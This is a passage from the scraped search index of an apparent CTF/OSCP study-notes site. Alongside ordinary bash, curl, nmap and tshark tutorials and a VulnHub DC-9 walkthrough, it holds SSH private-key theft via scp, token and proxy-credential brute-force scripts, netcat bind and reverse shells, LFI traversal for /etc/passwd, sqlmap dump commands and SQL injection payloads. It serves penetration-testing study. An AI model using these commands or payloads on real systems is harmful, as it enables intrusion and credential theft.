server, if they are kept as backup$ scp student@192.224.16.3:~/.ssh/id_rsa . # Once you have access to private keys of the user, you can login without password# Change the permissions of the private key id_rsa to 400.# It is required that your private key files are NOT accessible by others. $ chmod 400 id_rsa$ ssh -i id_rsa student@192.224.16.3 Example of private SSH keys lying in the computer Example case I: A development server that compiles, pulls/pushes code from a central code repository, and deploys the application/software on a test server might have private keys of deployment server and code server (to automate things and avoid credentials every time). Example case II: For automation, a lot of tools like Ansible, use SSH-based connections to multiple target machines, and perform a set of pre-defined actions. In this case, the machine hosting the Ansible will have the private keys. "},{"title":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","type":0,"sectionRef":"#","url":"docs/scripts/bash_scripts","content":""},{"title":"Sed","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#sed","content":"Copy# Format# sed 's/regexp/replace/g' filename.txtsed 's/,/ /g' filename.txt # replaces all comma with spacesed 's/\\//g' filename.txt # remove / from filename.txt "},{"title":"awk","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#awk","content":"Copyawk -F: '{print $1} creds # prints first coulumn of file creds which contains : separated valuesawk -F, '{print $1} creds # prints first coulumn of file creds which contains , separated values Useful Scripts# "},{"title":"Authorization Token","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#authorization-token","content":"Bash script to read different tokens from a file and pass them to curl command to find out the valid token for authorization. To read file line by line in a while loop you can refer Read file line by line Copy#!/bin/bashwhile read token; docontent=$(curl -s -H 'Authorization: Token '\"$token\" $1)if echo \"$content\" | grep -qi \"unauth\"; thencontinueelseecho \"Found token : $token\"fidone <$2 output Copy./brute.sh 192.186.248.3 wordlists/100-common-passwords.txt "},{"title":"Directory Listing","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#directory-listing","content":"Copy#!/bin/bashwhile read dir_name; doecho \"Trying directory: $dir_name\"curl http://$1$dir_namedone <$2 output Copy./testscript.sh 192.11.183.3 directory.txt "},{"title":"proxy authentication dictionary attk","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#proxy-authentication-dictionary-attk","content":"Copy#!/bin/bash while read userdo while read passwd do content=$(curl -I -x \"$user\":\"$passwd\"@$1 $2) echo \"$user - $passwd\" if echo \"$content\" | grep -qi \"407 proxy authentication required\"; then continue else echo \"Found usernam-pwd : $user - $passwd\" exit 0 fi done <$4done <$3 Copy$ ./crack.py 192.144.18.3:3128 127.0.0.1 usernames.lst password.lst System Commands# "},{"title":"find","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#find","content":"Copyfind / -type f -name '*.txt'find / -type f -perm 775 -user student "},{"title":"locate","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#locate","content":"Copy# -i option to perform a case-insensitive searchlocate wordlist "},{"title":"netstat","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#netstat","content":"Refs: https://www.binarytides.com/linux-netstat-command-examples/ netstat is a command line utility that can be used to list out all the network (socket) connections on a system. Copy# Enumerate services running on the target machineps -efnetstat -anlp Copy# List out all connectionsnetstat -a# List out only tcp connectionsnetstat -at# Disable reverse dns lookup for faster output. By default, the netstat command tries to find out the hostname of each ip address in the # connection by doing a reverse dns lookup. This slows down the output.netstat -n# List out only listening connectionsnetstat -l# Get process name/pid and user id. -p for process name/pid and -e for user# When using the -p option, netstat must be run with root privileges, otherwise it cannot detect the pids of processes running with root # privileges and most services like http and ftp often run with root privileges.sudo netstat -ltpe# All established connections from the server.netstat -natu | grep 'ESTABLISHED'netstat -natu | grep 'ESTABLISHED' | grep 61.177.142.158# Listening Connectionnetstat -an | grep 'LISTEN'netstat -tnl "},{"title":"ps","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#ps","content":"Copy# Display all processes in BSD formatps aux -a flag stands for all processes -x will display all processes even those not associated with the current tty Copy# To view a full format listing runps -ef "},{"title":"empty file","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#empty-file","content":"Copy# -n tells echo not to output the trailing newlineecho -n \"\" > access.log # The truncate command helps to shrink or extend the size of a file to a defined size.# -s option specifies the file sizetruncate -s 0 access.log Basic Bash Commands and Constructs# Refs : https://www.youtube.com/watch?v=LTuuMtQR1uQ&list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZThttps://www.youtube.com/watch?v=aNQCl_ByM20 "},{"title":"Basic Expressions","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#basic-expressions","content":"Copy#!/bin/bash # No space is allowed before and after the assignment (i.e. the equal sign) in BASHcounter=8 echo \"Double vs Single quote\"echo \"$counter\"# single quote prevents shell expansion to keep text as it isecho '$counter' echo \"Variable Expansion\"echo $counterecho ${counter}th floor echo \"Brace Expansion\"echo T{a,i,o}m echo \"Arithematic Expansion\"echo $[3*2]echo $((3*2))echo $((counter++))echo $((counter--)) echo \"Parameter Expansion\"opt=${1:-DEFAULT VALUE}echo $opt output CopyDouble vs Single quote8$counterVariable Expansion88th floorBrace ExpansionTam Tim TomArithematic Expansion6689Parameter ExpansionDEFAULT VALUE "},{"title":"If-else","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#if-else","content":"Copy#!/bin/bashecho \"Enter your username : \"; read NAME # format 1# if test-result-is-true; then COMMAND; fiif [ \"$NAME\" = \"Eliot\" ]; then echo \"Welcome back Eliot\"; else echo \"Please register\"; fi function test_func() { return 0} # format 2# if function-return-zero; then COMMAND; fiif test_functhen echo \"Function returned zero\"else echo \"Non zero return!!!\"fi output CopyEnter your username : EliotWelcome back EliotFunction returned zero "},{"title":"Menu select","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#menu-select","content":"Copy#!/bin/bashmenu=\"Pizza Burger FrenchFries Quit\"select choice in $menu; do [[ $choice == Quit ]] && { echo bye break } # REPLY is a BASH built-in variable for select construct echo \"You selected option $REPLY\"done output Copy1) Pizza2) Burger3) FrenchFries4) Quit#? 3You selected option 3#? 4bye "},{"title":"test Expressions","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#test-expressions","content":"We can make use of conditional expressions in the bash scripting. In order to know the available expressions use Copy$ help testtest: test [expr] Evaluate conditional expression. Exits with a status of 0 (true) or 1 (false) depending on the evaluation of EXPR. -d FILE True if file is a directory. -e FILE True if file exists. "},{"title":"for loops","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#for-loops","content":"Copy#!/bin/bashfor((i = 1, j = 10; i <= 3 && j <= 20; i++, j += 10)); do echo $i $j; done output Copy1 102 20 "},{"title":"for-in-loops","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#for-in-loops","content":"Copy#!/bin/bashfor NAME in $(cat names.txt); do echo \"Name is : $NAME\"done output CopyName is : ramName is : shayamName is : sita Copy#!/bin/bashecho \"Please enter the subnet : \"read SUBNETfor IP in $(seq 1 254); do ping -c 1 $SUBNET.$IPdone output CopyPlease enter the subnet : 192.234.246PING 192.234.246.1 (192.234.246.1) 56(84) bytes of data.64 bytes from 192.234.246.1: icmp_seq=1 ttl=64 time=0.079 ms "},{"title":"Functions","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#functions","content":""},{"title":"Read file line by line","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#read-file-line-by-line","content":"Refs: https://www.cyberciti.biz/faq/unix-howto-read-line-by-line-from-file/ while read -r line; do COMMAND; done < input.file The -r option passed to read command prevents backslash escapes from being interpreted. Add IFS= option before read command to prevent leading/trailing whitespace from being trimmed. while IFS= read -r line; do COMMAND $line; done < input.file Copy#!/bin/bashinput=\"/path/to/txt/file\"while IFS= read -r linedo echo \"$line\"done < \"$input\" "},{"title":"Use of test expression in if-else","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#use-of-test-expression-in-if-else","content":"Copy#!/bin/bashif [ -e /etc/shadow ]; then echo \"File exists\"; else echo \"Missing...\"; fi "},{"title":"Arguments","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#arguments","content":"Copy#!/bin/bashfunction show_arguments() { #define a function echo $@ # all arguments echo $* # all arguments echo $1 $2 # first and second arguments}show_arguments 1 \"a b c\" 3 output Copy1 a b c 31 a b c 31 a b c "},{"title":"Local Variables","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#local-variables","content":"Copy#!/bin/bashcounter=4function check() { #define a function local counter=8 echo $counter }checkecho $counter output Copy84 "},{"title":"Exit codes","type":1,"pageTitle":"Bash ScriptsBash#Useful Scripts#System Commands#Basic Bash Commands and Constructs#","url":"docs/scripts/bash_scripts#exit-codes","content":"Copy#!/bin/bashfunction func() { #define a function return $1 }func 5(($? != 0)) && { echo \"Error M1\"; } # Method 1if ! func 5; then echo \"Error M2\"; fi # Method 2 output CopyError M1Error M2 "},{"title":"Python Scripts","type":0,"sectionRef":"#","url":"docs/scripts/python_scripts","content":""},{"title":"Run shell programs by reading command line arguments","type":1,"pageTitle":"Python Scripts","url":"docs/scripts/python_scripts#run-shell-programs-by-reading-command-line-arguments","content":"This script reads different tokens from a file and pass them to curl command to find out the valid token for authorization Copyimport subprocessimport argparse def crack(filename, ip_addr) : with open(filename) as f: password_list = f.readlines() # to remove whitespace characters like `\\n` at the end of each line password_list = [x.strip() for x in password_list] print(password_list) for password in password_list : comd = \"curl -s -H 'Authorization: Token \" + password + \"' \" + ip_addr print(\"Trying...\" + password) output = subprocess.run(comd, capture_output=True, shell=True).stdout.decode('utf-8') if \"Unauth\".lower() in output.lower(): print(\"Unauth\".lower()+\"-->\" + output.lower()) continue else : print(\"Found : \" + password) break if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument(\"filename\", help=\"Enter the filename containing passwords\") parser.add_argument(\"ip_addr\", help=\"Enter the IP address of server including http://\") args = parser.parse_args() crack(args.filename, args.ip_addr) Output Copy$ python3 crack.py /root/wordlists/100-common-passwords.txt http://192.107.107.3Trying...damianunauth-->unauthorized accessTrying...123123123Found : 123123123 "},{"title":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","type":0,"sectionRef":"#","url":"docs/utilities/curl","content":""},{"title":"HTTP basic authentication","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#http-basic-authentication","content":"If a resource requires Basic HTTP Authentication, you can use the u option to pass the user:password values: Copycurl -u user:pass https://flaviocopes.com/curl -u bob:qwerty http://192.165.34.3/dir/ "},{"title":"Digest Authentication","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#digest-authentication","content":"Copycurl --digest -u alice:password1 http://192.165.34.3/poc/ "},{"title":"Token Authentication","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#token-authentication","content":"We have to set the token in headers for token authentication to work. Copycurl -H 'Authorization: Token <token>' 192.183.171.3 We have to write a custom wrapper around this command. In the script, we will rely on the fact that on using the correct token, we will get something else than \"Unauthorized Access\". You can refer this script https://github.com/jai-the-seeker/CTF-OSCP/blob/master/scripts.md#authorization-token After performing the dictionary attack we will get the password, which can be used to set the token in the headers Copy# -H, --header <header/@file> Pass custom header(s) to servercurl -H 'Authorization: Token 123123123' 192.186.248.3 Perform an HTTP GET request# When you perform a request, curl will return the body of the response: Copycurl https://flaviocopes.com/ HTTP response headers# "},{"title":"response headers i","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#response-headers-i","content":"By default the response headers are hidden in the output of curl. To show them, use the i option: Copycurl -i https://flaviocopes.com/ "},{"title":"Only response headers I","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#only-response-headers-i","content":"Using the I option, you can get only the headers, and not the response body: Copycurl -I https://flaviocopes.com/ Perform an HTTP POST request# The X option lets you change the HTTP method used. By default, GET is used, and it’s the same as writing Copycurl -X GET https://flaviocopes.com/ Using -X POST will perform a POST request. You can perform a POST request passing data URL encoded: Copycurl -d \"option=value&something=anothervalue\" -X POST https://flaviocopes.com/ In this case, the application/x-www-form-urlencoded Content-Type is sent. Perform an HTTP POST request sending JSON# Instead of posting data URL-encoded, like in the example above, you might want to send JSON. In this case you need to explicitly set the Content-Type header, by using the H option: Copycurl -d '{\"option\": \"value\", \"something\": \"anothervalue\"}' -H \"Content-Type: application/json\" -X POST https://flaviocopes.com/ You can also send a JSON file from your disk: Copycurl -d \"@my-file.json\" -X POST https://flaviocopes.com/ Perform an HTTP PUT request# The concept is the same as for POST requests, just change the HTTP method using -X PUT Follow a redirect# A redirect response like 301, which specifies the Location response header, can be automatically followed by specifying the L option: Copycurl http://flaviocopes.com/ will not follow automatically to the HTTPS version which I set up to redirect to, but this will: Copycurl -L http://flaviocopes.com/ Store the response to a file# Using the o option you can tell curl to save the response to a file: Copycurl -o file.html https://flaviocopes.com/ You can also just save a file by its name on the server, using the O option: Copycurl -O https://flaviocopes.com/index.html Set a different User Agent# The user agent tells the server which client is performing the request. By default curl sends the curl/<version> user agent, like: curl/7.54.0. You can specify a different user agent using the --user-agent option: Copycurl --user-agent \"my-user-agent\" https://flaviocopes.com Inspecting all the details of the request and the response# Use the --verbose option to make curl output all the details of the request, and the response: Copycurl --verbose -I https://flaviocopes.com/ proxy# Copy-x, --proxy [protocol://]host[:port]curl -x 192.201.208.3:3128 127.0.0.1 The proxy string can be specified with a protocol:// prefix. No protocol specified or http:// will be treated as HTTP proxy. Use socks4://, socks4a://, socks5:// or socks5h:// to request a specific SOCKS version to be used. "},{"title":"username and password for proxy","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#username-and-password-for-proxy","content":"In order to pass the credentials to the proxy server, we can use the curl option -U. Therefore, the following command will work: Copycurl -U admin:laurie -x 192.173.117.3:3128 127.0.0.1:1996 Alternatively, Copy# curl -x <[protocol://][user:password@]proxyhost[:port]> url# Example 1curl -x http://user:password@proxy-IP-here:port url-of-website:port# Example 2curl -x admin:laurie@192.142.49.3:3128 127.0.0.1:1996 "},{"title":"username and password for HTTP server","type":1,"pageTitle":"curlHTTP Authentication#Perform an HTTP GET request#HTTP response headers#Perform an HTTP POST request#Perform an HTTP POST request sending JSON#Perform an HTTP PUT request#Follow a redirect#Store the response to a file#Set a different User Agent#Inspecting all the details of the request and the response#proxy#","url":"docs/utilities/curl#username-and-password-for-http-server","content":"Copy# Get a file from an HTTP server that requires user and password, using the proxy:curl -u user:passwd -x my-proxy:888 http://www.get.this/ The curl -u option is used to specify credentials for the target server authentication and not for the proxy server authentication. For e.g, when you are using the command curl -u admin:laurie -x 192.173.117.3:3128 127.0.0.1:1996. The credentials admin:laurie are not being passed as credentials to the proxy server, instead, they are passed as a part of the request which is supposed to be forwarded to the target server. The option value will be considered as credentials for the target server authentication and not for the proxy authentication. The above command will work in the scenario where the proxy server is configured without authentication, but the target server is protected with authentication (basic/digest authentication). This way, the connection will be forwarded by the proxy server and the credentials will be used to authenticate with the target server. "},{"title":"ncNetcat#","type":0,"sectionRef":"#","url":"docs/utilities/nc","content":""},{"title":"banner grabbing","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#banner-grabbing","content":"Copy# sshnetcat 192.251.124.3 22# SMTPnetcat 192.251.124.3 25 # HTTPnetcat 192.251.124.3 25GET / HTTP/1.1 "},{"title":"listener","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#listener","content":"Copynetcat -l -p 6789 "},{"title":"transfer file","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#transfer-file","content":"Copy# sendernetcat <receiver_ip_addr> 6789 < send_file# receivernetcat -l -p 6789 > recv_file "},{"title":"port scanning","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#port-scanning","content":"Copynetcat -v -w1 -z <target_ip> <port_range> -v : verbose -w1 : wait for 1 sec before timeout -z : No I/O "},{"title":"executing program","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#executing-program","content":"The program can be an executable file (EXE, ELF, etc) or a script (shell, ruby, python etc)Any I/O is redirected to the established socket Copynetcat -e /path/to/executable "},{"title":"running shell","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#running-shell","content":""},{"title":"relaying","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#relaying","content":"Refs https://www.youtube.com/watch?v=FLoe9S4TASk "},{"title":"bind shell","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#bind-shell","content":"Copy# attackernetcat <victim_ip> 1234# victimnetcat -l -p 1234 -e /bin/bash "},{"title":"reverse shell","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#reverse-shell","content":"Copy# attackernetcat -l -p 1234# victimnetcat <attacker_ip> 1234 -e /bin/bash "},{"title":"server client relay","type":1,"pageTitle":"ncNetcat#","url":"docs/utilities/nc#server-client-relay","content":"Copy ------ ------------- ----- |client|-------------->|server|client|-------------->|server| ------ ------------- ------ Relay Target Copy# on relaymknod mypipe pnetcat -l -p 6789 < mypipe | netcat <target_ip> 80 > mypipe "},{"title":"nmapscans#scripts#","type":0,"sectionRef":"#","url":"docs/utilities/nmap","content":""},{"title":"basic scans","type":1,"pageTitle":"nmapscans#scripts#","url":"docs/utilities/nmap#basic-scans","content":"Copy# version of the running services# -sV: Probe open ports to determine service/version info# -sC: equivalent to --script=defaultnmap -sV -sC 192.165.34.3 # Alternativelynmap -A 192.165.34.3 scripts# "},{"title":"brute","type":1,"pageTitle":"nmapscans#scripts#","url":"docs/utilities/nmap#brute","content":""},{"title":"discovery","type":1,"pageTitle":"nmapscans#scripts#","url":"docs/utilities/nmap#discovery","content":""},{"title":"http-proxy-brute","type":1,"pageTitle":"nmapscans#scripts#","url":"docs/utilities/nmap#http-proxy-brute","content":"The http-brute script uses, by default, the database files usernames.lst and passwords.lst located at /nselib/data/ to try each password, for every user Copynmap --script http-proxy-brute -p3128 192.144.18.3 To use different username and password lists, set the arguments userdb and passdb :  Copynmap --script http-proxy-brute -p3128 192.144.18.3 --script-args userdb=usernames.lst,passdb=passwords.lst "},{"title":"banner","type":1,"pageTitle":"nmapscans#scripts#","url":"docs/utilities/nmap#banner","content":"Copy# nmap -sV --script=banner <target>nmap -sV --script=banner -p- 192.162.110.3 "},{"title":"sshSSH Server on Kali Linux#","type":0,"sectionRef":"#","url":"docs/utilities/ssh","content":""},{"title":"Install SSH server","type":1,"pageTitle":"sshSSH Server on Kali Linux#","url":"docs/utilities/ssh#install-ssh-server","content":"This step is usually not required in Kali Linux as it comes preinstalled with ssh server. However, if its not installed, you can use Copysudo apt-get install openssh-server "},{"title":"Enable root account access from ssh","type":1,"pageTitle":"sshSSH Server on Kali Linux#","url":"docs/utilities/ssh#enable-root-account-access-from-ssh","content":"By default Kali does not allow root account access from ssh. You need to make following changes in the config file. Copynano /etc/ssh/sshd_config Change following in the config file CopyPermitRootLogin yes Now, start the service and check its status Copyservice ssh startservice ssh status "},{"title":"tsharkBasic Commands#Display Filters#Statistics#","type":0,"sectionRef":"#","url":"docs/utilities/tshark","content":""},{"title":"WiFi Filters","type":1,"pageTitle":"tsharkBasic Commands#Display Filters#Statistics#","url":"docs/utilities/tshark#wifi-filters","content":"Copy# Command to display WPA handshake packets?tshark -r WiFi_traffic.pcap -Y 'eapol' Statistics# -z io,phs[,filter] Create Protocol Hierarchy Statistics listing both number of packets and bytes. If no filter is specified the statistics will be calculated for all packets. If a filter is specified statistics will only be calculated for those packets that match the filter. Copytshark -r HTTP_traffic.pcap -z io,phs -q Refs: https://www.wireshark.org/docs/man-pages/tshark.html "},{"title":"DC-9","type":0,"sectionRef":"#","url":"docs/vulnhub/DC-9","content":""},{"title":"Find IP Address of Machine","type":1,"pageTitle":"DC-9","url":"docs/vulnhub/DC-9#find-ip-address-of-machine","content":"Let's find the IP address of the DC-9 machine Copy$ arp-scan --interface=eth1 10.10.10.0/24 Interface: eth1, type: EN10MB, MAC: 08:00:27:5a:bb:1d, IPv4: 10.10.10.106Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)10.10.10.1 0a:00:27:00:00:05 (Unknown: locally administered)10.10.10.100 08:00:27:6d:d8:39 PCS Systemtechnik GmbH10.10.10.109 08:00:27:2e:3b:e6 PCS Systemtechnik GmbH The arp-scan reult shows the IP address of DC-9 machine as 10.10.10.109 "},{"title":"Nmap Scan","type":1,"pageTitle":"DC-9","url":"docs/vulnhub/DC-9#nmap-scan","content":"Scan the default ports Copyroot@kali:~# nmap -sV -sC -oA dc-9.output 10.10.10.109Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 06:59 EDTNmap scan report for 10.10.10.109Host is up (0.00017s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION22/tcp filtered sshMAC Address: 08:00:27:2E:3B:E6 (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.00 seconds Sleep for sometime and start the port scan for all the ports Copyroot@kali:~# sleep 300; nmap -p- -oA dc-9-allports 10.10.10.109 "},{"title":"LFILFI#","type":0,"sectionRef":"#","url":"docs/web/LFI","content":""},{"title":"Fuzz URI parameters","type":1,"pageTitle":"LFILFI#","url":"docs/web/LFI#fuzz-uri-parameters","content":"https://github.com/jai-the-seeker/CTF-OSCP/blob/master/web/web_recon.md#fuzzing-parameter-for-lfi "},{"title":"Check for LFI","type":1,"pageTitle":"LFILFI#","url":"docs/web/LFI#check-for-lfi","content":"Refs https://www.exploit-db.com/papers/12886http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.htmlhttps://highon.coffee/blog/lfi-cheat-sheet/ "},{"title":"Step 1: Directory Traversal","type":1,"pageTitle":"LFILFI#","url":"docs/web/LFI#step-1-directory-traversal","content":"In burpsuite, send the intercepted request to repeater mode. Then temper with the arguments of the parameter, to find the LFI vulnerability. In case the vulnerability exists, the contents of /etc/passwd, will show up in the response. In case, there are no parameters being supplied to the URI, the same can be found by fuzzing. In the example below, the parameter file has been found out through fuzzing URI parameters. CopyGET /manage.php?file=../../../../../../../../../../../etc/passwd HTTP/1.1 "},{"title":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","type":0,"sectionRef":"#","url":"docs/web/sql_injection","content":""},{"title":"GET request","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#get-request","content":"Copysqlmap -u \"http://example.com/?a=1&b=2&c=3\" -p \"a,b\" "},{"title":"POST request","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#post-request","content":"Copysqlmap -u \"http://example.com/\" --data \"a=1&b=2&c=3\" -p \"a,b\" --method POST Alternatively, copy the POST request in the intercept of burpsuite in a file and use it as follows Copy$ cat web.txtPOST /results.php HTTP/1.1Host: 10.10.10.109User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://10.10.10.109/search.phpContent-Type: application/x-www-form-urlencodedContent-Length: 13Connection: closeUpgrade-Insecure-Requests: 1 search=killer Copysqlmap -r web.txt -p \"search\" "},{"title":"databases","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#databases","content":"Copysqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --dbs  "},{"title":"tables","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#tables","content":"Copysqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --tables -D testdb "},{"title":"data","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#data","content":"Copysqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" --dump -D testdb -T users "},{"title":"columns","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#columns","content":"Copysqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" -D testdb -T users --columns "},{"title":"INFORMATION_SCHEMA Tables","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#information_schema-tables","content":"https://dev.mysql.com/doc/refman/8.0/en/columns-table.htmlhttps://dev.mysql.com/doc/refman/8.0/en/schemata-table.htmlhttps://dev.mysql.com/doc/refman/8.0/en/st-units-of-measure-table.html Manual Methods# "},{"title":"check vulnerability","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#check-vulnerability","content":"Copy' or 1='1' or 1=1;--' or 1=1;#') or ('x'='x' or like '%';--' or 1=1 LIMIT 1;-- USERNAME: ' or 1/*PASSWORD: */ =1 -- USERNAME: admin' or 'a'='aPASSWORD '# "},{"title":"enumerate fields of search query","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#enumerate-fields-of-search-query","content":"In burpsuite, go to repeater mode and keep on increasing the numbers till the fields of search query gets printed on the webpage Copysearch=killer' UNION SELECT 1,2,3,4,5,6-- - Copy<h3>Search results </h3>ID: 1<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/> "},{"title":"enumerate databases","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#enumerate-databases","content":""},{"title":"enumerate tables","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#enumerate-tables","content":"Copysearch=killer' UNION SELECT GROUP_CONCAT(TABLE_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=\"Staff\"-- - Copy<h3>Search results </h3> ID: StaffDetails,Users<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/> "},{"title":"enumerate columns","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#enumerate-columns","content":"Copysearch=killer' UNION SELECT GROUP_CONCAT(COLUMN_NAME),2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=\"Staff\" AND TABLE_NAME=\"Users\"-- - Copy<h3>Search results </h3>ID: UserID,Username,Password<br/>Name: 2 3<br/>Position: 4<br />Phone No: 5<br />Email: 6<br/> "},{"title":"show data","type":1,"pageTitle":"SQL Injectionsqlmap#INFORMATION_SCHEMA#Manual Methods#","url":"docs/web/sql_injection#show-data","content":"Copysearch=killer' UNION SELECT 